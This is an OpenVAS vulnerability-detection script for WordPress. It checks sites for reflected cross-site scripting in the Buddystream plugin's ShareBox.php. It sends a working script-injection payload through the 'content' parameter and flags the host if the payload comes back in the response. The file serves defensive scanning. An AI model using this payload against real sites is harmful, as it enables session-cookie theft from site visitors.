###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_buddystream_plugin_mult_xss_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress Buddystream Plugin Multiple XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803049");
  script_version("$Revision: 13962 $");
  script_bugtraq_id(56526);
  script_tag(name:"last_modification", value:"$Date: 2017-04-17 11:02:19 +0200 (Mo, 17 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-11-16 14:11:37 +0530 (Fri, 16 Nov 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Buddystream Plugin Multiple XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/50972");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80044");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/50972");
  script_xref(name:"URL", value:"http://packetstorm.foofus.com/1211-advisories/sa50972.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to insert arbitrary
  HTML and script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed.");

  script_tag(name:"affected", value:"WordPress Buddystream Plugin version 2.6.2 and prior");

  script_tag(name:"insight", value:"Input passed via the 'content' and 'link' parameters to
  /wp-content/plugins/buddystream/extensions/default/templates/ShareBox.php is
  not properly sanitised before it is returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running WordPress Buddystream Plugin and is prone
  to multiple cross site scripting vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/buddystream/extensions/default/templates/ShareBox.php?content="><script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\)</script>", extra_check:">ShareBox")){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);